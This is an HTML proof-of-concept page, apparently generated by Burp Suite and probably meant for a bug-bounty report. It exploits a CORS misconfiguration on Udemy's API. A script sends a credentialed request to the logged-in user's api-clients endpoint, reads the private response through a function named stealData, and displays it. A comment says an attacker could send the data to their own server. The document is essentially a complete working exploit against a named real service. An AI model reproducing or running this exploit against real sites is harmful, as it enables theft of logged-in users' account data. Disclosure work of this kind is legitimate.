<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
<script>
    var req = new XMLHttpRequest();
    req.open('GET',"https://www.udemy.com/api-2.0/users/me/api-clients/",true);
    req.onload = stealData;
    req.withCredentials = true;
    req.send();

    function stealData(){
        //reading response is allowed because of the CORS misconfiguration.
        var data= JSON.stringify(JSON.parse(this.responseText),null,2);

        //display the data on the page. A real attacker can send the data to his server.
        output(data);
    }

    function output(inp) {
        document.body.appendChild(document.createElement('pre')).innerHTML = inp;
    }
    </script>
     </body>
</html>
    
